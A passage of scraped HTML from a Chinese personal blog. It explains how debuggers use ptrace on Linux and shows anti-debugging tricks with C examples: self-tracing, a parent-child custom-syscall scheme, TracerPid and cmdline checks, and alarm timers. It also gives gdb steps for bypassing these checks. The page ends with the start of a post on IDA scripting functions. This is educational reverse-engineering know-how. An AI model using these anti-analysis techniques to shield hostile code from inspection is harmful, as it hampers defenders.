class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/reg.h&gt;   /* For constants ORIG_EAX etc */</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt; /* SYS_write */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    pid_t child;</span><br><span class="line">    long orig_rax;</span><br><span class="line">    int status;</span><br><span class="line">    int iscalling = 0;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line"></span><br><span class="line">    child = fork();</span><br><span class="line">    if(child == 0) </span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, 0, 0);//发送信号给父进程表示已做好准备被调试</span><br><span class="line">        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-l&quot;, &quot;-h&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        while(1)</span><br><span class="line">        &#123;</span><br><span class="line">            wait(&amp;status);//等待子进程发来信号或者子进程退出</span><br><span class="line">            if(WIFEXITED(status))</span><br><span class="line">            //WIFEXITED函数(宏)用来检查子进程是被ptrace暂停的还是准备退出</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0);</span><br><span class="line">            //获取rax值从而判断将要执行的系统调用号</span><br><span class="line">            if(orig_rax == SYS_write)</span><br><span class="line">            &#123;//如果系统调用是write</span><br><span class="line">                ptrace(PTRACE_GETREGS, child, 0, &amp;regs);</span><br><span class="line">                if(!iscalling)</span><br><span class="line">                &#123;</span><br><span class="line">                    iscalling = 1;</span><br><span class="line">                    //打印出系统调用write的各个参数内容</span><br><span class="line">                    printf(&quot;SYS_write call with %p, %p, %p\n&quot;,</span><br><span class="line">                            regs.rdi, regs.rsi, regs.rdx);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;SYS_write call return %p\n&quot;, regs.rax);</span><br><span class="line">                    iscalling = 0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, 0, 0);</span><br><span class="line">            //PTRACE_SYSCALL,其作用是使内核在子进程进入和退出系统调用时都将其暂停</span><br><span class="line">            //得到处于本次调用之后下次调用之前的状态</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行后，会输出如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ gcc ./ptrace1.c -o ptrace1 &amp;&amp; ./ptrace1 </span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0xf</span><br><span class="line">总用量 940K</span><br><span class="line">SYS_write call return 0xf</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x35</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 8.7K 11月 16 03:10 ptrace1</span><br><span class="line">SYS_write call return 0x35</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x37</span><br><span class="line">-rw-rw-r-- 1 zeref zeref  601 11月 16 03:10 ptrace1.c</span><br><span class="line">SYS_write call return 0x37</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x35</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 8.7K 11月 16 03:16 ptrace2</span><br><span class="line">SYS_write call return 0x35</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x37</span><br><span class="line">-rw-rw-r-- 1 zeref zeref 1.3K 11月 16 03:16 ptrace2.c</span><br><span class="line">SYS_write call return 0x37</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x32</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 892K 11月 15 22:57 test</span><br><span class="line">SYS_write call return 0x32</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x33</span><br><span class="line">-rwxrwxr-x 1 zeref zeref 8.4K 11月 15 22:51 test1</span><br><span class="line">SYS_write call return 0x33</span><br><span class="line">SYS_write call with 0x1, 0x9e1020, 0x35</span><br><span class="line">-rw-rw-r-- 1 zeref zeref  174 11月 15 22:51 test1.c</span><br><span class="line">SYS_write call return 0x35</span><br></pre></td></tr></table></figure>

<p>可以看到，每一次进行系统调用前以及调用后的寄存器内容都发生的变化，并且输出了<code>ls -l -h</code>的内容</p>
<p>这只是ptrace的部分功能，ptrace能做到的事情还有更多，比如还能修改内存，修改寄存器的值，插入字节码实现下断点的功能，这里仅仅简单介绍一下gdb调试器的大概实现原理</p>
<p>如果对编写调试器感兴趣的话，可以康康这个大佬的博客： <a href="https://veritas501.space/2017/10/16/翻译_编写一个Linux调试器/" target="_blank" rel="noopener">veritas501</a></p>
<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>介绍完调试的原理，就需要思考下一个问题，如果防止别人调试我们写好的程序？</p>
<p>最简单的办法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 )</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&apos;t trace me:(\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me:)\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据前面说的，只要能当其他进程的爹，就能调试他，但ptrace有个规定是，每个进程只能被<code>PTRACE_TRACEME</code>一次，因此只要程序的开头就先执行一次<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1</p>
<p><del>这大概就是我先当了我自己的爹，别人就不能当我爹吧</del></p>
<p>运行情况如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./anti1 </span><br><span class="line">no one trace me:)</span><br><span class="line">----</span><br><span class="line">$ gdb ./anti1</span><br><span class="line">$pwndbg&gt; r</span><br><span class="line">Starting program: /home/zeref/桌面/debug&amp;anti/anti1 </span><br><span class="line">don&apos;t trace me:(</span><br><span class="line">[Inferior 1 (process 21216) exited with code 01]</span><br></pre></td></tr></table></figure>

<p>那如果遇到这种反调试该如何绕过呢？</p>
<p>一般有以下几种操作：</p>
<ol>
<li><p>打patch，把有关ptrace函数的部分nop掉</p>
</li>
<li><p>利用hook技术，把ptrace函数给替换成自定义的ptrace函数，从而可以任意指定它的返回值</p>
</li>
<li><p>充分利用gdb的catch命令，<code>catch syscall ptrace</code>会在发生ptrace调用的时候停下，因此在第二次停住的时候<code>set $rax=0</code>，从而绕过程序中<code>ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1</code>的判断</p>
<p>效果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./anti1</span><br><span class="line"> $pwndbg&gt; catch syscall ptrace</span><br><span class="line"> Catchpoint 1 (syscall &apos;ptrace&apos; [101])</span><br><span class="line"> $pwndbg&gt; r</span><br><span class="line"> Starting program: /home/zeref/桌面/debug&amp;anti/anti1 </span><br><span class="line"> Catchpoint 1 (call to syscall ptrace), 0x00007ffff7b0ae2e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45</span><br><span class="line"></span><br><span class="line"> $pwndbg&gt; c</span><br><span class="line"> Continuing.</span><br><span class="line"></span><br><span class="line"> Catchpoint 1 (returned from syscall ptrace), 0x00007ffff7b0ae2e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45</span><br><span class="line"></span><br><span class="line"> 在连续si到即将执行ret时</span><br><span class="line"> $pwndbg&gt; set $rax=0</span><br><span class="line"> $pwndbg&gt; c</span><br><span class="line"> Continuing.</span><br><span class="line"> no one trace me:)</span><br><span class="line"> [Inferior 1 (process 21279) exited normally]</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><strong>那么问题又来了，如何防止我们的程序被这种骚操作绕过反调试呢？</strong></p>
<p>分析一下上面的绕过方法，发现本质上都是为了使得<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>无效，因为使之无效化又不影响主程序的逻辑，那便可以完美绕过</p>
<p>所以这里一种方法是这样，想办法生成一个子进程，并且ptrace跟踪它，并且使他与父进程的运行逻辑密不可分，这样一来单纯的干掉一个ptrace函数调用就不能绕过反调试</p>
<p>比如，可以通过自己定义syscall的方式来实现父子进程之间的身份认证，确保子进程是与父进程在通讯，而不是与gdb在通讯</p>
<p>例子如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#define SYS_CALL_myread 12345</span><br><span class="line">#define SYS_CALL_mywrite 67890</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void myread(char *str,int len)</span><br><span class="line">&#123;</span><br><span class="line">    syscall(SYS_CALL_myread, str,len,0);</span><br><span class="line">&#125;</span><br><span class="line">void mywrite(char *str)</span><br><span class="line">&#123;</span><br><span class="line">    syscall(SYS_CALL_mywrite, str,strlen(str),1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void tracee() </span><br><span class="line">&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br><span class="line">    raise(SIGCONT);//向自身发送SIGCONT信号，表示继续执行</span><br><span class="line">    char *str1=&quot;what is your name?\n&quot;;</span><br><span class="line">    static char name[0x10];</span><br><span class="line">    char *ptr_name=name;</span><br><span class="line">    mywrite(str1);</span><br><span class="line">    myread(ptr_name,0x10);</span><br><span class="line"></span><br><span class="line">    puts(&quot;welcome!&quot;);</span><br><span class="line">    mywrite(ptr_name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void tracer(pid_t child_pid)</span><br><span class="line">&#123;</span><br><span class="line">    int status;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line"></span><br><span class="line">    waitpid(child_pid, &amp;status, 0);</span><br><span class="line">    //如果子进程的ptrace被patch掉，则无法接收到status</span><br><span class="line">    if (!WIFSTOPPED(status))</span><br><span class="line">    &#123;//宏用来指出子进程是正常退出的，返回一个非零值</span><br><span class="line">        printf(&quot;gg\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_EXITKILL);</span><br><span class="line">    //如果子进程处于退出状态则发送一个SIGKILL信号给它</span><br><span class="line"></span><br><span class="line">    while (WIFSTOPPED(status))</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, child_pid, 0, 0);//在子进程进程syscall之前断下</span><br><span class="line">        waitpid(child_pid, &amp;status, 0);</span><br><span class="line">        ptrace(PTRACE_GETREGS, child_pid, 0, &amp;regs);//获取寄存器值</span><br><span class="line"></span><br><span class="line">        if (regs.orig_rax == SYS_CALL_mywrite)</span><br><span class="line">        &#123;</span><br><span class="line">            //str,strlen(str),1</span><br><span class="line">            regs.orig_rax = SYS_write;</span><br><span class="line">            unsigned long long int tmp = regs.rdx;</span><br><span class="line">            regs.rdx = regs.rsi;</span><br><span class="line">            regs.rsi = regs.rdi;</span><br><span class="line">            regs.rdi=tmp;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SETREGS, child_pid, 0, &amp;regs);</span><br><span class="line">            //设置寄存器值，使其改为正确的syscall</span><br><span class="line">        &#125;</span><br><span class="line">        if (regs.orig_rax == SYS_CALL_myread)</span><br><span class="line">        &#123;</span><br><span class="line">            //str,strlen(str),0</span><br><span class="line">            regs.orig_rax = SYS_read;</span><br><span class="line">            unsigned long long int tmp = regs.rdx;</span><br><span class="line">            regs.rdx = regs.rsi;</span><br><span class="line">            regs.rsi = regs.rdi;</span><br><span class="line">            regs.rdi=tmp;</span><br><span class="line">            ptrace(PTRACE_SETREGS, child_pid, 0, &amp;regs);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ptrace(PTRACE_SYSCALL, child_pid, 0, 0);</span><br><span class="line">        waitpid(child_pid, &amp;status, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">    pid_t child_pid = fork();</span><br><span class="line">    if (child_pid &lt; 0) </span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;gg\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if (child_pid == 0) </span><br><span class="line">    &#123;</span><br><span class="line">        tracee();</span><br><span class="line">    &#125; </span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        tracer(child_pid);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方法可以在一定程度上加大反调试力度，但其实还是有办法应对的，可以通过逆向发现父子进程直接的互动无非就是syscall的系统调用号和参数的转换，那只要逆的明明白白，仍然可以强行打patch，把myread，mywrite又改回正常的read，write就可以绕过反调试了</p>
<p><strong>所以又该怎么样继续加大反调试的力度呢？</strong></p>
<p>可以考虑如下操作</p>
<ol>
<li>加大力度，定义更多的syscal来代替libc函数，增大逆向难度</li>
<li>不仅仅单纯的替换系统调用号和参数，可以加入数据的交互，比如通过管道通信添加加密与解密的操作</li>
<li>给程序加很多花里胡哨的混淆，增加理解程序逻辑难度</li>
<li>……</li>
</ol>
<p><strong>这大概就是攻击与防御的乐趣吧，如果哪位大佬还有更骚操作和想法请务必评论区分享一波</strong></p>
<h3 id="其他小技巧"><a href="#其他小技巧" class="headerlink" title="其他小技巧"></a>其他小技巧</h3><p>上面是专门针对ptrace进行的反调试与绕过反调试的分析，下面还有几种比较偏门的反调试措施，但是这些措施都比较容易绕过，通过打patch基本上都可以绕过，这里就简单介绍一下</p>
<p><strong>1.检测/proc/self/status</strong></p>
<p>检查 <code>/proc/self/status</code> 中的 <code>TracerPID</code> - 正常运行时为0，在有debugger挂载的情况下变为debugger的PID。因此通过不断读取这个值可以发现是否存在调试器，进行对应处理</p>
<p>例子如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    int TracerPid=0;</span><br><span class="line">    fp=fopen(&quot;/proc/self/status&quot;,&quot;r&quot;);</span><br><span class="line">    // printf(&quot;%p\n&quot;,fp);</span><br><span class="line">    static char buf[0x100];</span><br><span class="line">    char *ptr=&amp;buf;</span><br><span class="line">    while(fgets(ptr, 0x100, fp))</span><br><span class="line">    &#123;</span><br><span class="line">        if (strstr(ptr,&quot;TracerPid&quot;))</span><br><span class="line">        &#123;   </span><br><span class="line">            char tmp[0x10];</span><br><span class="line">            int len=strlen(ptr);</span><br><span class="line">            TracerPid=atoi((char *)ptr+len-3);</span><br><span class="line">            if (TracerPid != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(&quot;don&apos;t debug me!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        test();</span><br><span class="line">        sleep(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似的操作还有扫描整个虚拟地址空间，在text段查找被修改的字节码，如当调试器下断点的时候实际上会插入int3的字节码，从而达到断下的目的，如果扫描到这些特征字节码（如0xcc等等）就马上停止程序，从而达到反调试的作用，同样的比较容易被绕过，这里就只提供一种思路，不再举具体例子</p>
<p><strong>2.检测/proc/self/cmdline</strong></p>
<p>这种操作本质上就是在检测输入的命令内容，如果输入执行<code>gdb ./xx</code>或者<code>strace ./xx</code>就会被检测到</p>
<p>总体还是还是比较鸡肋的，如果先进gdb在attach pid的话就检测不到。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) </span><br><span class="line">&#123;</span><br><span class="line">   char buf1[0x20], buf2[0x100];</span><br><span class="line">   FILE* fp;</span><br><span class="line"></span><br><span class="line">   snprintf(buf1, 24, &quot;/proc/%d/cmdline&quot;, getppid());</span><br><span class="line">   fp = fopen(buf1, &quot;r&quot;);</span><br><span class="line">   fgets(buf2, 0x100, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line"></span><br><span class="line">   if(!strcmp(buf2, &quot;gdb&quot;) || !strcmp(buf2, &quot;strace&quot;)||!strcmp(buf2, &quot;ltrace&quot;))</span><br><span class="line">   &#123;</span><br><span class="line">       printf(&quot;Debugger detected&quot;);</span><br><span class="line">       return 1;</span><br><span class="line">   &#125;  </span><br><span class="line">   printf(&quot;All good&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.忽略int3异常信号</strong></p>
<p>调试中最常见的操作便是下断点，而一般的下断点的方法就是在即将执行的指令前插入int3的字节码 (CC) ，在程序执行到int3时，就会触发 SIGTRAP 信号，而调试器就会接收到这些信号进行并对子进程进行处理，而如果子进程通过设置signal函数忽略SIGTRAP  信号，就可以使得断点无效，也就能达到反调试的作用</p>
<p>但是这个操作似乎只适用于反调试远古时期的gdb，现在的最新版本gdb基本上都防不住，仅提供一种思路</p>
<p><strong>4.设置时间间隔</strong></p>
<p>在程序启动时，通过alarm设置定时，到达时则中止程序 ，这样就不能长时间调试程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void alarmHandler(int sig)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;don&apos; t debug me&quot;);</span><br><span class="line">   exit(1);</span><br><span class="line">&#125;</span><br><span class="line">void__attribute__((constructor))setupSig(void) </span><br><span class="line">&#123;//设置程序一开始就执行</span><br><span class="line">   signal(SIGALRM, alarmHandler);</span><br><span class="line">   alarm(3);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[]) </span><br><span class="line">&#123;</span><br><span class="line">   getchar();</span><br><span class="line">   puts(&quot;hello!&quot;);</span><br><span class="line">   puts(&quot;hello!&quot;);</span><br><span class="line">   puts(&quot;hello!&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然还是比较容易绕过，方法很多很多</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.toby.moe/linux-anti-debugging/" target="_blank" rel="noopener">https://blog.toby.moe/linux-anti-debugging/</a></p>
<p><a href="http://www.voidcn.com/article/p-hogkwhfh-ys.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-hogkwhfh-ys.html</a></p>
<p><a href="https://blog.csdn.net/stonesharp/article/details/8211526" target="_blank" rel="noopener">https://blog.csdn.net/stonesharp/article/details/8211526</a></p>
<p><a href="http://drops.xmd5.com/static/drops/mobile-16969.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/mobile-16969.html</a></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/IDA╜┼▒╛▒╩╝╟╥╗/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/10/IDA╜┼▒╛▒╩╝╟╥╗/" class="post-title-link" itemprop="url">IDA脚本笔记一</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-12-10 19:00:19" itemprop="dateCreated datePublished" datetime="2019-12-10T19:00:19-08:00">2019-12-10</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2019-12-11 11:01:04" itemprop="dateModified" datetime="2019-12-11T11:01:04-08:00">2019-12-11</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-读取和修改数据的函数"><a href="#0x01-读取和修改数据的函数" class="headerlink" title="0x01 读取和修改数据的函数"></a>0x01 读取和修改数据的函数</h2><h3 id="01-Byte"><a href="#01-Byte" class="headerlink" title="01 Byte"></a>01 Byte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Byte</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>从虚拟地址<strong>addr</strong>处读取一个字节值</p>
<h3 id="02-Word"><a href="#02-Word" class="headerlink" title="02 Word"></a>02 Word</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Word</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>从虚拟地址<strong>addr</strong>处读取一个字（2字节）值</p>
<h3 id="03-Dword"><a href="#03-Dword" class="headerlink" title="03 Dword"></a>03 Dword</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Dword</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>从虚拟地址<strong>addr</strong>处读取一个双字（4字节）值</p>
